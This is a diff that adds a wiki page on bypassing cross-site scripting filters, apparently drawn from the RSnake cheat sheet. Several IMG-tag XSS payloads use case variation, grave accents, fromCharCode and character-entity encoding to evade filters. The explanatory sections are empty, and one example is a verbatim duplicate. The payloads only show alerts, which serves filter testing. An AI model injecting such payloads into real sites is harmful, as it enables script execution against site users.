@@ -1,1 +1,80 @@
-TODO
+----
+= Advanced Cross Site Scrpt filter bypassing =
+----
+
+
+== What really is an XSS ==
+
+== What someone can do with XSS ==
+
+== Using case variation ==
+
+----
+{{{
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+}}}
+----
+
+== Using the JavaScript directive ==
+
+Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well: 
+
+----
+{{{
+<IMG SRC="javascript:alert('XSS');">
+}}}
+----
+
+== Using grave accent obfuscation ==
+
+If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents: 
+
+----
+{{{
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+}}}
+----
+
+== Using malformed IMG tags ==
+
+Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
+
+----
+{{{
+<IMG SRC="javascript:alert('XSS');">
+}}}
+----
+
+== Using the fromCharCode ==
+
+if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need: 
+
+----
+{{{
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+}}}
+----
+
+== Using UTF-8 unicode encoding ==
+
+All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). 
+
+----
+{{{
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+}}}
+----
+
+== Using HTML entities ==
+
+The semicolons are required for this to work:
+
+----
+{{{
+<IMG SRC=javascript:alert("XSS")>
+}}}
+----
+
+
+
